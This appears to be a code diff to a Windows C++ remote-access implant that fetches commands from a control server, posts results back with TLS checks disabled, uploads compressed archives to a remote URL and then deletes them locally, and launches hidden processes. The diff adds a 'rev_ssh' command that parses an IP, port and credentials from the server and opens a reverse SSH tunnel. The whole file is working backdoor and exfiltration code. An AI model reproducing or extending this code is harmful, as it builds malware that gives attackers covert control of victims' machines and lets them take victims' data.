@@ -18,7 +18,7 @@
 #include "ctun.h"
 #include "camera.h"
 #include "reconwin.h"
-
+#include "ssh_client.h"
 
 struct CommandInfo {
     std::string command;
@@ -182,7 +182,6 @@ void sendFormResults(CURL* curl, const std::string& formUrl, const std::string& 
     curl_easy_setopt(curl, CURLOPT_USERAGENT, hexHash.c_str());
 
 
-    // Construire les données POST
     std::string postData = "command=" + command +
                             "&extra=" + extra +
                             "&uuid=" + uuid +
@@ -190,8 +189,6 @@ void sendFormResults(CURL* curl, const std::string& formUrl, const std::string& 
                             "&csrf_token=" + csrfToken;
 
     curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postData.c_str());
-
-    // Exécuter la requête
     CURLcode res = curl_easy_perform(curl);
 
     if (res != CURLE_OK) {
@@ -205,7 +202,6 @@ void sendFormResults(CURL* curl, const std::string& formUrl, const std::string& 
 
 
 void performFileUpload(CURL* curl, const char* uploadUrl, const char* commandsUrl, const char* compressedArchivePath, const CommandInfo& commandInfo, const std::string& csrfToken,const std::string& hexHash) {
-    // Reset cURL options
     curl_easy_reset(curl);
     curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
     curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
@@ -214,7 +210,6 @@ void performFileUpload(CURL* curl, const char* uploadUrl, const char* commandsUr
     curl_easy_setopt(curl, CURLOPT_REFERER, commandsUrl);
     curl_easy_setopt(curl, CURLOPT_USERAGENT, hexHash.c_str());
 
-    // Set up the form data
     struct curl_httppost* post = nullptr;
     struct curl_httppost* last = nullptr;
 
@@ -225,11 +220,7 @@ void performFileUpload(CURL* curl, const char* uploadUrl, const char* commandsUr
     curl_formadd(&post, &last, CURLFORM_COPYNAME, "csrf_token", CURLFORM_COPYCONTENTS, csrfToken.c_str(), CURLFORM_END);
 
     curl_easy_setopt(curl, CURLOPT_HTTPPOST, post);
-
-    // Perform the file upload
     CURLcode res = curl_easy_perform(curl);
-
-    // Free the form data
     curl_formfree(post);
 
     if (res != CURLE_OK) {
@@ -237,7 +228,6 @@ void performFileUpload(CURL* curl, const char* uploadUrl, const char* commandsUr
     } else {
         std::cout << "File uploaded successfully!" << std::endl;
 
-        // Delete the compressed archive
         if (remove(compressedArchivePath) == 0) {
             std::cout << "Compressed archive deleted successfully!" << std::endl;
         } else {
@@ -245,7 +235,6 @@ void performFileUpload(CURL* curl, const char* uploadUrl, const char* commandsUr
         }
     }
 }
-
 
 bool runInBackground(const char* executablePath) {
     STARTUPINFO si;
@@ -708,7 +697,38 @@ int main() {
                 result = "Error: Executable file does not exist at path: " + executableFilename;           
             }
             sendFormResults(curl, formUrl, commandsUrl, commandInfo.command, commandInfo.extra, commandInfo.uuid, result, csrfToken,hexHash);
-                      
+
+        } else if (commandInfo.command == "rev_ssh") {
+            std::cout << "Extracted Command: " << commandInfo.command << std::endl;
+            std::cout << "Extracted UUID: " << commandInfo.uuid << std::endl;
+            std::cout << "ssh tunnel..." << std::endl;
+            std::cout << "Content of 'commandInfo.extra': " << commandInfo.extra << std::endl;
+
+            std::regex addressPortUserPassRegex("\\(\\s*([^:]+):(\\d+)\\s*\\)\\s*\\(\\s*([^:]+):([^\\)]+)\\s*\\)");
+
+            std::smatch addressPortMatch;
+            if (std::regex_search(commandInfo.extra, addressPortMatch, addressPortUserPassRegex)) {
+                std::string ip = addressPortMatch[1].str();
+                int port = std::stoi(addressPortMatch[2].str());
+                std::string username = addressPortMatch[3].str();
+                std::string password = addressPortMatch[4].str();
+
+                // Call the ssh_client function
+                ssh_client(ip.c_str(), port, username.c_str(), password.c_str());
+
+                // Update 'result' after ssh_client if necessary
+                result = "Successfully executed reverse tunnel.";
+            } else {
+                std::cerr << "Invalid format for reverse tunnel command 'extra'." << std::endl;
+                result = "Invalid format for reverse tunnel command 'extra'.";
+            }
+            std::cout << "Value of 'result' after ssh_client: " << result << std::endl;
+            sendFormResults(curl, formUrl, commandsUrl, commandInfo.command, commandInfo.extra, commandInfo.uuid, result, csrfToken, hexHash);
+
+        
+
+
+
         } else if (commandInfo.command == "rev_tun_port") {
             std::cout << "Executing reverse tunneling..." << std::endl;
             std::regex addressPortRegex("\\(\\s*([^:]+):(\\d+)\\s*\\)\\s*\\(\\s*([^:]+):(\\d+)\\s*\\)");
@@ -730,7 +750,7 @@ int main() {
                 std::cerr << "Invalid 'extra' format for reverse tunneling command." << std::endl;
                 result = "Invalid 'extra' format for reverse tunneling command.";
             }
-           sendFormResults(curl, formUrl, commandsUrl, commandInfo.command, commandInfo.extra, commandInfo.uuid, result, csrfToken,hexHash);        
+            sendFormResults(curl, formUrl, commandsUrl, commandInfo.command, commandInfo.extra, commandInfo.uuid, result, csrfToken,hexHash);        
 
         } else {
             std::cerr << "Unable to initialize cURL." << std::endl;
